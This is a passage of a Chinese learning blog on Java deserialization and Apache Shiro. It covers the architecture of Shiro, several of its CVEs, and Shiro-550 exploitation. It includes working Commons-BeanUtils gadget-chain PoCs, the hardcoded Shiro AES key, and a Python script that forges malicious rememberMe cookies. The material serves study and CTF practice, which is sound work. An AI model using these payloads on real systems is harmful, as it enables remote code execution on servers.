答：不行，因为假设queue这个只有一个值，那么在序列化的时候就会抛出数组越界的异常 poc为 public class test &#123; public static &lt;T&gt; void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, TransformerConfigurationException, NoSuchFieldException, IOException, ClassNotFoundException &#123; TemplatesImpl templates &#x3D; new TemplatesImpl(); Field name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;123&quot;); &#x2F;&#x2F; _class赋值为null Field classField &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;); classField.setAccessible(true); classField.set(templates,null); &#x2F;&#x2F;加载恶意类的字节码 Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:&#x2F;&#x2F;ctftools&#x2F;ctfscript&#x2F;javastudy&#x2F;CC&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;cc3&#x2F;cmd.class&quot;)); &#x2F;&#x2F;转为二维数组 byte[][] codes &#x3D; &#123;code&#125;; bytecodes.set(templates,codes); &#x2F;&#x2F;_tfactory赋值 Field tfactory &#x3D; templates.getClass().getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates,new TransformerFactoryImpl()); &#x2F;&#x2F; Object transletInstance &#x3D; PropertyUtils.getProperty(templates, &quot;outputProperties&quot;); BeanComparator&lt;Object&gt; objectBeanComparator &#x3D; new BeanComparator&lt;&gt;(&quot;outputProperties&quot;); PriorityQueue&lt;Object&gt; objects &#x3D; new PriorityQueue&lt;&gt;(objectBeanComparator); Field size &#x3D; objects.getClass().getDeclaredField(&quot;size&quot;); size.setAccessible(true); size.set(objects,2); Field queue &#x3D; objects.getClass().getDeclaredField(&quot;queue&quot;); queue.setAccessible(true); queue.set(objects,new Object[]&#123;templates,1&#125;); file.serialize(objects,&quot;1.bin&quot;); file.unserialize(&quot;1.bin&quot;); &#125; &#125; 总结调用链 PriorityQueue.readObject() BeanComparator.compare() PropertyUtils.getProperty() PropertyUtilsBean.getProperty() TemplatesImpl.getOutputProperties() 依赖环境 cc 3.21 ~ 4.4 cb 1.90 ~ 1.94 其他版本没试 调用链（无依赖前言刚才的调用链，虽然很完美，但实际上还是依赖了CC链 这里就算把maven项目里的cc依赖去掉也不会报错的原因是因为cb本身就依赖着cc 但是在最开始的时候，我就提过本来是在学shiro 的，发现shiro无依赖反序列化需要用CB链，所以就先学一下CB链 因为shiro本身需要添加的依赖有 shiro-core、shiro-web，这是shiro本身的依赖 javax.servlet-api、jsp-api，这是JSP和Servlet的依赖，仅在编译阶段使用，因为Tomcat中自带这两个依赖 slf4j-api、slf4j-simple，这是为了显示shiro中的报错信息添加的依赖 commons-logging，这是shiro中用到的一个接口，不添加会爆java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory错误 可以看到并没有CC依赖，所以，我们在进行shiro反序列化的时候就需要考虑不存在CC依赖的情况 这时候可以发现在shiro的依赖中，还带着CB，所以我们就可以尝试用CB链去打shiro反序列化 但实际上，直接打是会报错的。 commons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于commons-collections，但反序列化利用的时候需要依赖于commons-collections。 所以我们就需要找一个不需要依赖CC的CB链 完善我们先来看一下CB链中的哪一部分调用了CC的内容 就是BeanComparator里的这个构造方法，当我们只传入一个property的时候，就会默认调用CC中ComparableComparator类的getInstance方法 所以要实现无依赖，就需要避免使用这个构造方法，但是property是必传的，所以只能用这个构造方法了 我们需要找一个类，满足以下条件 实现java.util.Comparator接口 实现java.io.Serializable接口 Java、shiro或commons-beanutils自带，且兼容性强 这里我们找到的是处于java.lang.String类下的一个内部私有类CaseInsensitiveComparator类 所以现在的poc是 public class test &#123; public static &lt;T&gt; void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, TransformerConfigurationException, NoSuchFieldException, IOException, ClassNotFoundException &#123; TemplatesImpl templates &#x3D; new TemplatesImpl(); Field name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;123&quot;); &#x2F;&#x2F; _class赋值为null Field classField &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;); classField.setAccessible(true); classField.set(templates,null); &#x2F;&#x2F;加载恶意类的字节码 Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:&#x2F;&#x2F;ctftools&#x2F;ctfscript&#x2F;javastudy&#x2F;CC&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;cc3&#x2F;cmd.class&quot;)); &#x2F;&#x2F;转为二维数组 byte[][] codes &#x3D; &#123;code&#125;; bytecodes.set(templates,codes); &#x2F;&#x2F;_tfactory赋值 Field tfactory &#x3D; templates.getClass().getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates,new TransformerFactoryImpl()); &#x2F;&#x2F; Object transletInstance &#x3D; PropertyUtils.getProperty(templates, &quot;outputProperties&quot;); BeanComparator&lt;Object&gt; objectBeanComparator &#x3D; new BeanComparator&lt;&gt;(&quot;outputProperties&quot;,String.CASE_INSENSITIVE_ORDER); PriorityQueue&lt;Object&gt; objects &#x3D; new PriorityQueue&lt;&gt;(objectBeanComparator); Field size &#x3D; objects.getClass().getDeclaredField(&quot;size&quot;); size.setAccessible(true); size.set(objects,2); Field queue &#x3D; objects.getClass().getDeclaredField(&quot;queue&quot;); queue.setAccessible(true); queue.set(objects,new Object[]&#123;templates,1&#125;); file.serialize(objects,&quot;1.bin&quot;); file.unserialize(&quot;1.bin&quot;); &#125; &#125;","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"Java","slug":"Java","permalink":"https://ethe448.github.io/tags/Java/"},{"name":"反序列化","slug":"反序列化","permalink":"https://ethe448.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"shiro安全","slug":"shiro安全","date":"2023-04-25T06:28:19.000Z","updated":"2023-05-16T15:37:25.817Z","comments":true,"path":"2023/04/25/shiro安全/","link":"","permalink":"https://ethe448.github.io/2023/04/25/shiro%E5%AE%89%E5%85%A8/","excerpt":"","text":"这篇博客本来是打算只写一些shiro反序列化的内容的，但是发现了一篇关于shiro已知的所有cve的漏洞分析，因此就打算顺着这篇文章把shiro的漏洞都看一下，也是怕之后这个文章没了。其中的理论部分大概率和文章里的一模一样，一个是我觉得这个理论写的已经很足够了，另一个原因是我在这之前也没啥理论基础（ 参考文章 简介Apache Shiro 是一个 Java 安全框架，包括如下功能和特性： Authentication：身份认证/登陆，验证用户是不是拥有相应的身份。在 Shiro 中，所有的操作都是基于当前正在执行的用户，这里称之为一个 Subject，在用户任意代码位置都可以轻易取到这个Subject。Shiro 支持数据源，称之为 Realms，可以利用其连接 LDAP\\AD\\JDBC 等安全数据源，并支持使用自定义的 Realms，并可以同时使用一个或多个 Realms 对一个用户进行认证，认证过程可以使用配置文件配置，无需修改代码。同时，Shiro 还支持 RememberMe，记住后下次访问就无需登录。 Authorization：授权，即权限验证，验证某个已认证的用户是否拥有某个权限。同样基于 Subject、支持多种 Realms。Shiro 支持 Wildcard Permissions ，也就是使用通配符来对权限验证进行建模，使权限配置简单易读。Shiro 支持基于 Roles 和基于 Permissions 两种方式的验证，可以根据需要进行使用。并且支持缓存产品的使用。 Session Manager：会话管理，用户登陆后就是一次会话，在没有退出之前，它的所有信息都在会话中。Shiro 中的一切（包括会话和会话管理的所有方面）都是基于接口的，并使用 POJO 实现，因此可以使用任何与 JavaBeans 兼容的配置格式（如 JSON、YAML、Spring XML 或类似机制）轻松配置所有会话组件。Session 支持缓存集群的方式；还支持事件侦听器，允许在会话的生命周期内侦听生命周期事件，以执行相关逻辑。Shiro Sessions 保留发起会话的主机的 IP 地址，因此可以根据用户位置来执行不同逻辑。Shiro 对 Web 支持实现了 HttpSession 类及相关全部 API。也可以在 SSO 中使用。 Cryptography：加密，保护数据的安全性；Shiro 专注于使用公私钥对数据进行加密，以及对密码等数据进行不可逆的哈希。 Permissions：用户权限；Shiro 将所有的操作都抽象为 Permission，并默认使用 Wildcard Permissions 来进行匹配。Shiro 支持实例级别的权限控制校验，例如domain:action:instance。 Caching：缓存，为了提高 Shiro 在业务中的性能表现。Shiro 的缓存支持基本上是一个封装的 API，由用户自行选择底层的缓存方式。缓存中有三个重要的接口 CacheManager/Cache/CacheManagerAware ，Shiro 提供了默认的 MemoryConstrainedCacheManager 等实现。 Shiro概要架构 其中： Subject :主体对象，负责提交用户认证和授权信息。 SecurityManager：安全管理器，负责认证，授权等业务实现。 Realm：领域对象，负责从数据层获取业务数据。 接下来详细说一下这三个组件 SecurityManagerorg.apache.shiro.mgt.SecurityManager 是 shiro 的一个核心接口，接口负责了一个 Subject 也就是“用户”的全部安全操作： 接口本身定义了 createSubject、login、logout 三个方法用来创建 Subject、登陆和退出。 扩展了 org.apache.shiro.authc.Authenticator 接口，提供了 authenticate 方法用来进行认证。 扩展了 org.apache.shiro.authz.Authorizer 接口，提供了对 Permission 和 Role 的校验方法。包括 has/is/check 相关命名的方法。 扩展了 org.apache.shiro.session.mgt.SessionManager 接口，提供了 start、getSession 方法用来创建可获取会话。 Shiro 为 SecurityManager 提供了一个包含了上述所有功能的默认实现类 org.apache.shiro.mgt.DefaultSecurityManager，中间继承了很多中间类，并逐层实现了相关的方法，继承关系如下图。 DefaultSecurityManager 中包含以下属性: subjectFactory：默认使用 DefaultSubjectFactory，用来创建具体 Subject 实现类。 subjectDAO：默认使用 DefaultSubjectDAO，用于将 Subject 中最近信息保存到 Session 里面。 rememberMeManager：用于提供 RememberMe 相关功能。 sessionManager：默认使用 DefaultSessionManager，Session 相关操作会委托给这个类。 authorizer：默认使用 ModularRealmAuthorizer，用来配置授权策略。 authenticator：默认使用 ModularRealmAuthenticator，用来配置认证策略。 realm：对认证和授权的配置，由用户自行配置，包括 CasRealm、JdbcRealm 等。 cacheManager：缓存管理，由用户自行配置，在认证和授权时先经过，用来提升认证授权速度。 DefaultSecurityManager 还有一个子类，就是 org.apache.shiro.web.mgt.DefaultWebSecurityManager，这个类在 shiro-web 包中，是 Shiro 为 HTTP/SOAP 等 http 协议连接提供的实现类，这个类默认创建配置了 org.apache.shiro.web.mgt.CookieRememberMeManager 用来提供 RememberMe 相关功能。 Subjectorg.apache.shiro.subject.Subject 是一个接口，用来表示在 Shiro 中的一个用户。因为在太多组件中都使用了 User 的概念，所以 Shiro 故意避开了这个关键字，使用了 Subject。 Subject 接口同样提供了认证（login/logout）、授权（访问控制 has/is/check 方法）以及获取会话的能力。在应用程序中如果想要获取一个当前的 Subject，通常使用 SecurityUtils.getSubject() 方法即可。 单从方法的命名和覆盖的功能来看，Subject 提供了与 SecurityManager 非常近似的方法，\b用来执行相关权限校验操作。而实际上，Subject 接口在 core 包中的实现类 org.apache.shiro.subject.support.DelegatingSubject 本质上也就是一个 SecurityManager 的代理类。 DelegatingSubject 中保存了一个 transient 修饰的 SecurityManager 成员变量，在使用具体的校验方法时，实际上委托 SecurityManager 进行处理，如下图： DelegatingSubject 中不会保存和维持一个用户的“状态（角色/权限）”，恰恰相反，每次它都依赖于底层的实现组件 SecurityManager 进行检查和校验，因此通常会要求 SecurityManager 的实现类来提供一些缓存机制。所以本质上，Subject 也是一种“无状态”的实现。 RealmRealm 翻译过来是“领域、王国”，这里可以将其理解以为一种“有界的范围”，实际上就是权限和角色的认定。 org.apache.shiro.realm.Realm 是 Shiro 中的一个接口，Shiro 通过 Realm 来访问指定应用的安全实体——用户、角色、权限等。一个 Realm 通常与一个数据源有 1 对 1 的对应关系，如关系型数据库、文件系统或者其他类似的资源。 因此，此接口的实现类，将使用特定于数据源的 API 来进行认证或授权，如 JDBC、文件IO、Hibernate/JPA 等等，官方将其解释为：特定于安全的 DAO 层。 在使用中，开发人员通常不会直接实现 Realm 接口，而是实现 Shiro 提供了一些相关功能的抽象类 AuthenticatingRealm/AuthorizingRealm，或者使用针对特定数据源提供的实现类如 JndiLdapRealm/JdbcRealm/PropertiesRealm/TextConfigurationRealm/IniRealm 等等。继承关系大概如下： 较多情况下，开发人员会自行实现 AuthorizingRealm 类，并重写 doGetAuthorizationInfo/doGetAuthenticationInfo 方法来自行实现自身的认证和授权逻辑。 小结通过对以上三个组件的了解，一次认证及授权的校验流程就形成了： 应用程序通过获取当前访问的 Subject（也就是用户），并调用其相应校验方法； Subject 将校验委托给 SecurityManager 进行判断； SecurityManager 会调用 Realm 来获取信息来判断用户对应的角色能否进行操作。 使用这块跟开发关系有点大，感觉得单独学，所以我这里就直接ctrl cv了。 web.xml在普通 web 项目中， Shiro 框架的注入是通过在 web.xml 中配置 Filter 的方式完成的。 在 Shiro 1.1 及之前的版本，通过配置 IniShiroFilter ，并在 /WEB-INF/shiro.ini 或 classpath:shiro.ini 中进行相应的权限配置。也可以指定配置文件路径，示例如下： &lt;filter> &lt;filter-name>ShiroFilter&lt;/filter-name> &lt;filter-class>org.apache.shiro.web.servlet.IniShiroFilter&lt;/filter-class> &lt;init-param> &lt;param-name>configPath&lt;/param-name> &lt;param-value>/WEB-INF/anotherFile.ini&lt;/param-value> &lt;/init-param> &lt;/filter> 在 Shiro 1.2 及之后的版本，可以进行如下配置： &lt;listener> &lt;listener-class>org.apache.shiro.web.env.EnvironmentLoaderListener&lt;/listener-class> &lt;/listener> ... &lt;filter> &lt;filter-name>ShiroFilter&lt;/filter-name> &lt;filter-class>org.apache.shiro.web.servlet.ShiroFilter&lt;/filter-class> &lt;/filter> &lt;filter-mapping> &lt;filter-name>ShiroFilter&lt;/filter-name> &lt;url-pattern>/*&lt;/url-pattern> &lt;/filter-mapping> 官方更推荐直接使用 ShiroFilter 类进行处理，并为 Web 应用程序配置了一个 Listener： EnvironmentLoaderListener。这是一个 ServletContextListener 的子类，会在初始化时将 WebEnvironment 的实现类注入到 ServletContext 中。 ShiroFilter 则使用 WebEnvironment 中的 WebSecurityManager 来作为当前 Shiro 上下文中的 SecurityManager。 在 Filter 处理流程中，ShiroFilter 继承的 doFilter 调用 AbstractShiroFilter#doFilterInternal 方法，会使用保存的 SecurityManager 创建 Subject 对象。 并调用其 execute 方法执行后续的校验逻辑。 默认情况下，EnvironmentLoaderListener 创建的 WebEnvironment 的实例是 IniWebEnvironment，是基于 INI 格式的配置文件，如果不想使用这个格式，可以通过自实现一个 IniWebEnvironment 的子类，用来处理自己定义的配置文件格式，并在 web.xml 中进行如下配置： &lt;context-param> &lt;param-name>shiroEnvironmentClass&lt;/param-name> &lt;param-value>org.su18.shiro.web.config.WebEnvironment&lt;/param-value> &lt;/context-param> 关于 INI 配置文件的配置，在官方文档配置一章有详细描述，主要包括 [main]、[users]、[roles]、[urls] 四项配置。如果配置了 [users] 或 [roles]，则会自动创建 org.apache.shiro.realm.text.IniRealm 实例，并可以在 [main] 配置中进行调用及配置。 这里重点的配置，就在于 [urls] 这个配置项，详情参考相关官方配置文档。大概可以配置成如下形式： [urls] &#x2F;index &#x3D; anon &#x2F;user&#x2F;** &#x3D; authc &#x2F;admin&#x2F;** &#x3D; authc, roles[administrator] &#x2F;audit&#x2F;** &#x3D; authc, perms[&quot;remote:invoke&quot;] 简单来说，就是一个 Ant 风格的路径表达式与需要处理他的 Filter 之间的映射。Shiro 使用 org.apache.shiro.web.filter.mgt.FilterChainManager 自己维护一套 FilterChain 的机制，用来依次对多个 Filter 进行校验。 Shiro 默认提供了一些 Filter，名称及对应处理类如下表格，如果想深入理解某个 Filter 功能的具体实现，可以具体查看。 Filter 名称 对应类 anon org.apache.shiro.web.filter.authc.AnonymousFilter authc org.apache.shiro.web.filter.authc.FormAuthenticationFilter authcBasic org.apache.shiro.web.filter.authc.BasicHttpAuthenticationFilter authcBearer org.apache.shiro.web.filter.authc.BearerHttpAuthenticationFilter invalidRequest org.apache.shiro.web.filter.InvalidRequestFilter logout org.apache.shiro.web.filter.authc.LogoutFilter noSessionCreation org.apache.shiro.web.filter.session.NoSessionCreationFilter perms org.apache.shiro.web.filter.authz.PermissionsAuthorizationFilter port org.apache.shiro.web.filter.authz.PortFilter rest org.apache.shiro.web.filter.authz.HttpMethodPermissionFilter roles org.apache.shiro.web.filter.authz.RolesAuthorizationFilter ssl org.apache.shiro.web.filter.authz.SslFilter user org.apache.shiro.web.filter.authc.UserFilter 在请求访问到达 ShiroFilter 后，会根据 request 的信息，调用 org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain 方法匹配配置的 pathPattern 以及 requestURI，如果有匹配，则会添加一层 ProxiedFilterChain 代理。这里看到，如果 pathMatches 方法匹配，将会进行 return，因此配置的顺序也很重要。 也就是说，Shiro 不会向 Servlet Context 中添加其他的 Filter，而是使用嵌套 ProxiedFilterChain 代理的方式扩展 FilterChain，并在自身 Filter 都处理结束之后继续执行原 FilterChain。 这里简单说其实就是shiro在servlet的filter前面又套了一层filter，因此在调用的时候会先调shiro的filter，然后再调servlet自己的filter Spring在目前的环境下，越来越多的 Web 环境使用了 SpringBoot/SpringMVC 及相关生态，因此更多的时候会将 Shiro 集成配置在其中。为了应对此环境，Shiro 提供了 shiro-spring 包来进行配置。 在 Servlet 项目中，是通过在 web.xml 中配置了能匹配所有 URL 路径 /* 的 ShiroFilter，并由其执行后续逻辑。而在 Spring 生态下，由于 IoC 与 DI 的思想，通常把所有的 Filter 注册成为 Bean 交给 Spring 来管理。 此时如果想要将 Shiro 逻辑注入其中，就用到了关键类：ShiroFilterFactoryBean。这是 Shiro 为 Spring 生态提供的工厂类，由它在 spring 中承担了之前 ShiroFilter 的角色。内部类 SpringShiroFilter 继承了 AbstractShiroFilter，实现了类似的逻辑。 可以结合 spring-web 包中的 DelegatingFilterProxy 配置使用，其作用就是一个 filter 的代理，被它代理的 filter 将由 spring 来管理其生命周期。 ShiroFilterFactoryBean 还是 BeanPostProcessor 的子类，实现了对于 Filter 子类自动发现和处理的技术，所以我们可以通过配置 ShiroFilterFactoryBean 的方式来注册 SpringShiroFilter。 其他的配置也可以全部交由 Spring 管理，我们只需要对 ShiroFilterFactoryBean 进行配置即可，简单的示例代码如下： &#x2F;** * @author su18 *&#x2F; @Configuration public class ShiroConfig &#123; @Bean MyRealm myRealm() &#123; return new MyRealm(); &#125; @Bean RememberMeManager cookieRememberMeManager() &#123; return new CookieRememberMeManager(); &#125; @Bean SecurityManager securityManager(MyRealm myRealm, RememberMeManager cookieRememberMeManager) &#123; DefaultWebSecurityManager manager &#x3D; new DefaultWebSecurityManager(); manager.setRealm((Realm) myRealm); manager.setRememberMeManager(cookieRememberMeManager); return manager; &#125; @Bean(name &#x3D; &#123;&quot;shiroFilter&quot;&#125;) ShiroFilterFactoryBean shiroFilterFactoryBean(SecurityManager securityManager) &#123; ShiroFilterFactoryBean bean &#x3D; new ShiroFilterFactoryBean(); bean.setSecurityManager(securityManager); bean.setLoginUrl(&quot;&#x2F;index&#x2F;login&quot;); bean.setUnauthorizedUrl(&quot;&#x2F;index&#x2F;unauth&quot;); LinkedHashMap&lt;String, String&gt; map &#x3D; new LinkedHashMap&lt;String, String&gt;(); map.put(&quot;&#x2F;index&#x2F;user&quot;, &quot;authc&quot;); map.put(&quot;&#x2F;index&#x2F;**&quot;, &quot;anon&quot;); map.put(&quot;&#x2F;audit&#x2F;**&quot;, &quot;authc, perms[\\&quot;audit:list\\&quot;]&quot;); map.put(&quot;&#x2F;admin&#x2F;**&quot;, &quot;authc, roles[admin]&quot;); map.put(&quot;&#x2F;logout&quot;, &quot;logout&quot;); bean.setFilterChainDefinitionMap(map); return bean; &#125; &#125; 安全漏洞这里是这篇文章的主要部分 根据官方网站上的漏洞通报，shiro 在历史上共通报了 11 个 CVE，其中包含认证绕过、反序列化等漏洞类型 不过除了shiro550和shiro721，其他几个洞感觉全是路径解析造成的问题，所以可能就直接照抄参考文章了 CVE-2010-3863漏洞信息 漏洞信息 详情 漏洞编号 CVE-2010-3863 / CNVD-2010-2715 影响版本 shiro &lt; 1.1.0 &amp; JSecurity 0.9.x 漏洞描述 Shiro 在对请求路径与 shiro.ini 配置文件配置的 AntPath 进行对比前 未进行路径标准化，导致使用时可能绕过权限校验 漏洞关键字 /./ | 路径标准化 漏洞补丁 Commit-ab82949 相关链接 https://vulners.com/nessus/SHIRO_SLASHDOT_BYPASS.NASL https://marc.info/?l=bugtraq&amp;m=128880520013694&amp;w=2 漏洞详解（没找到对应版本，凑合看吧 之前提到过，Shiro 使用 PathMatchingFilterChainResolver#getChain 方法获取和调用要执行的 Filter，逻辑如下： getPathWithinApplication() 方法调用 WebUtils.getPathWithinApplication() 方法，用来获取请求路径。通过如下逻辑可看到，方法获取 Context 路径以及 URI 路径，然后使用字符串截取的方式去掉 Context 路径。 获取 URI 路径的方法 getRequestUri() 获取 javax.servlet.include.request_uri 的值，并调用 decodeAndCleanUriString() 处理。 decodeAndCleanUriString() 是 URL Decode 及针对 JBoss/Jetty 等中间件在 url 处添加 ;jsessionid 之类的字符串的适配，对 ; 进行了截取。 处理之后的请求 URL 将会使用 AntPathMatcher#doMatch 进行匹配尝试。 流程梳理到这里就出现了一个重大的问题：在匹配之前，没有进行标准化路径处理，导致 URI 中如果出现一些特殊的字符，就可能绕过安全校验。比如如下配置： [urls] &#x2F;user&#x2F;** &#x3D; authc &#x2F;admin&#x2F;list &#x3D; authc, roles[admin] &#x2F;admin&#x2F;** &#x3D; authc &#x2F;audit&#x2F;** &#x3D; authc, perms[&quot;audit:list&quot;] &#x2F;** &#x3D; anon 在上面的配置中，为了一些有指定权限的需求的接口进行了配置，并为其他全部的 URL /** 设置了 anno 的权限。在这种配置下就会产生校验绕过的风险。 因为/./flag不会匹配到其中任何一个需要带权限访问的路径，因此就会导致成为了/**的anno权限，实现了越权访问 漏洞修复Shiro 在 ab82949 更新中添加了标准化路径函数。 对 /、//、/./、/../ 等进行了处理。 CVE-2014-0074漏洞信息 漏洞信息 详情 漏洞编号 CVE-2014-0074 / CNVD-2014-03861 / SHIRO-460 影响版本 shiro 1.x &lt; 1.2.3 漏洞描述 当程序使用LDAP服务器并启用非身份验证绑定时，远程攻击者可借助空的用户名或密码利用该漏洞绕过身份验证。 漏洞关键字 ldap | 绕过 | 空密码 | 空用户名 | 匿名 漏洞补丁 Commit-f988846 相关链接 https://stackoverflow.com/questions/21391572/shiro-authenticates...in-ldap https://www.openldap.org/doc/admin24/security.html 这个感觉利用条件跟shiro关系好像不是很大，先放一下，等以后学了ldap再说 CVE-2016-4437漏洞信息 漏洞信息 详情 漏洞编号 CVE-2016-4437 / CNVD-2016-03869 / SHIRO-550 影响版本 shiro 1.x &lt; 1.2.5 漏洞描述 如果程序未能正确配置 “remember me” 功能使用的密钥。 攻击者可通过发送带有特制参数的请求利用该漏洞执行任意代码或访问受限制内容。 漏洞关键字 cookie | RememberMe | 反序列化 | 硬编码 | AES 漏洞补丁 Commit-4d5bb00 相关链接 SHIRO-441 https://www.anquanke.com/post/id/192619 shiro的反序列化漏洞，算是shiro里比较重要的漏洞了 环境配置IDEA搭建shiro550复现环境_shiro550环境搭建_普通网友的博客-CSDN博客 漏洞详解Shiro 从 0.9 版本开始设计了 RememberMe 的功能，用来提供在应用中记住用户登陆状态的功能。 RememberMeManager首先是接口 org.apache.shiro.mgt.RememberMeManager，这个接口提供了 5 个方法： getRememberedPrincipals：在指定上下文中找到记住的 principals，也就是 RememberMe 的功能。 forgetIdentity：忘记身份标识。 onSuccessfulLogin：在登陆校验成功后调用，登陆成功时，保存对应的 principals 供程序未来进行访问。 onFailedLogin：在登陆失败后调用，登陆失败时，在程序中“忘记”该 Subject 对应的 principals。 onLogout: 在用户退出时调用，当一个 Subject 注销时，在程序中“忘记”该 Subject 对应的 principals。 之前曾在 DefaultSecurityManager 的成员变量中见到了 RememberMeManager 成员变量，会在登陆、认证等逻辑中调用其中的相关方法。 AbstractRememberMeManager同时，Shiro 还提供了一个实现了 RememberMeManager 接口的抽象类 AbstractRememberMeManager，提供了一些实现技术细节。先介绍其中重要的几个成员变量： DEFAULT_CIPHER_KEY_BYTES：一个 Base64 的硬编码的 AES Key，也是本次漏洞的关键点，这个 key 会被同时设置为加解密 key 成员变量：encryptionCipherKey/decryptionCipherKey 。 serializer：Shiro 提供的序列化器，用来对序列化和反序列化标识用户身份的 PrincipalCollection 对象。 cipherService：用来对数据加解密的类，实际上是 org.apache.shiro.crypto.AesCipherService 类，这是一个对称加密的实现，所以加解密的 key 是使用了同一个。 在其初始化时，会创建 DefaultSerializer 作为序列化器，AesCipherService 作为加解密实现类，DEFAULT_CIPHER_KEY_BYTES 作为加解密的 key。 漏洞成因Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会将用户信息加密，加密过程:用户信息=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值。如果用户勾选记住密码，那么在请求中会携带cookie，并且将加密信息存放在cookie的rememberMe字段里面，在服务端收到请求对rememberMe值，先base64解码然后AES解密再反序列化，这个加密过程如果我们知道AES加密的密钥，那么我们把用户信息替换成恶意命令，就导致了反序列化RCE漏洞。在shiro版本&lt;=1.2.4中使用了默认密钥kPH+bIxk5D2deZiIxcaaaA==，这就更容易触发RCE漏洞。所以我们Payload产生的过程：命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值 源码分析然后我们可以下个断点跟一下 shiro里的Filter 处理流程 调用链如下 AbstractShiroFilter.doFilterInternal() AbstractShiroFilter.createSubject() WebSubject.Builder.buildWebSubject() Subject.Builder.buildSubject() DefaultSecurityManager.createSubject() DefaultSecurityManager.resolvePrincipals() DefaultSecurityManager.getRememberedIdentity() AbstractRememberMeManager.getRememberedPrincipals() CookieRememberMeManager.getRememberedSerializedIdentity() 首先，filter流程肯定要调用AbstractShiroFilter#doFilterInternal 方法 然后去调用 AbstractShiroFilter.createSubject()创建 Subject 对象 创建 Subject 对象后，会试图从利用当前的上下文中的信息来解析当前用户的身份，将会调用 DefaultSecurityManager#resolvePrincipals 方法 继续调用 AbstractRememberMeManager#getRememberedPrincipals 方法 这个方法就是将 SubjectContext 中的信息转为 PrincipalCollection 的关键方法，也是漏洞触发点。在 try 语句块中共有两个方法，分别是 getRememberedSerializedIdentity 和 convertBytesToPrincipals 方法。 getRememberedSerializedIdentity我们之前提过这个方法，其实看名字也知道是读取序列化的用户信息，作用就是获取 Cookie 中的内容并 Base64 解码返回 byte 数组。 然后这个返回的byte数组又传到了convertBytesToPrincipals方法里面进行处理 在这个方法里，调用了一个解密和反序列化的方法 先看这个解密函数 跟一下这个CipherService cipherService = getCipherService();就能发现他是负责加密方式的， 就是给一个aes的加密 然后在这一行进行真正的加密操作 看名字也能猜出来，一个放密文，一个放密钥 密文肯定就是我们cookie里的东西，这个可以先不看，所以先看看密钥 再往里跟会发现这个密钥其实是个常量 这就是shiro550最根本的漏洞原因 由于对cookie内容的aes解密密钥采用的是固定值，因此我们可以通过获取这一密钥来修改cookie中的内容，使在之后的反序列化过程中反序列化我们构造的恶意cookie 接下来再来看反序列化的过程 这里就是调了一个原生的readObject，因此我们就可以去利用这一反序列化 漏洞利用在漏洞利用之前还要说一点前提 在shiro中，选择了remember登录后，系统会给出两个cookie，一个是JSESSIONID，另一个是rememberMe，而当JSESSIONID存在的时候，shiro可以直接通过DefaultSecurityManager#resolvePrincipals 方法判断用户的角色，因此用户角色不为空，也就不会进入到这个if判断里，从而就不会进入getRememberedIdentity，更别说去获取rememberMe的值进行解密和反序列化操作了。所以漏洞利用的时候构造完payload还要把JSESSIONID删了 接下来是正式利用的部分 我们先尝试着去进行java原生的反序列化，也就是urldns链 urldns链当我们成功登录时，可以看到返回的内容中存在很长一串cookie 首先生成一个urldns的payload文件 aes加密脚本 import sys import base64 import uuid from random import Random from Crypto.Cipher import AES def get_file(filename): with open(filename,&#39;rb&#39;) as f: data &#x3D; f.read() return data def aesEncode(data): BS &#x3D; AES.block_size pad &#x3D; lambda s: s + ((BS-len(s)%BS)) * chr(BS-len(s)%BS).encode() key &#x3D; &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot; mode &#x3D; AES.MODE_CBC iv &#x3D; uuid.uuid4().bytes encryptor &#x3D; AES.new(base64.b64decode(key),mode,iv) ciphertext &#x3D; base64.b64encode(iv+encryptor.encrypt(pad(data))) return ciphertext def aesDecode(enc_data): enc_data &#x3D; base64.b64decode(enc_data) unpad &#x3D; lambda s:s[:-s[-1]] key &#x3D; &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot; mode &#x3D; AES.MODE_CBC iv &#x3D; enc_data[:16] encryptor &#x3D; AES.new(base64.b64decode(key),mode,iv) plaintext &#x3D; encryptor.decrypt(enc_data[16:]) plaintext &#x3D; unpad(plaintext) return plaintext if __name__ &#x3D;&#x3D; &#39;__main__&#39;: data &#x3D; get_file(&quot;ser.bin&quot;) print(aesEncode(data)) 执行加密脚本生成payload 修改rememberMe的值然后刷新一下提交，看看bp里就行了 调试一下也能看见 反序列化的时候有了个HashMap，说明我们的URLDNS链成功调用了 可是只能发起dns请求可还不够，我们的目的是命令执行 CB链无依赖打shiro550之前写CB链的那个文章也说了，就是专门为了shiro550才学的，所以这里直接用了（记得jdk版本改一改，一下午的教训 这里也要注意一个问题，就是如果直接用CB那篇文章里的配置来打shiro550是不会成功的，在控制台可以看见这样的报错 这是因为shiro里自带的CB是1.8.3版本 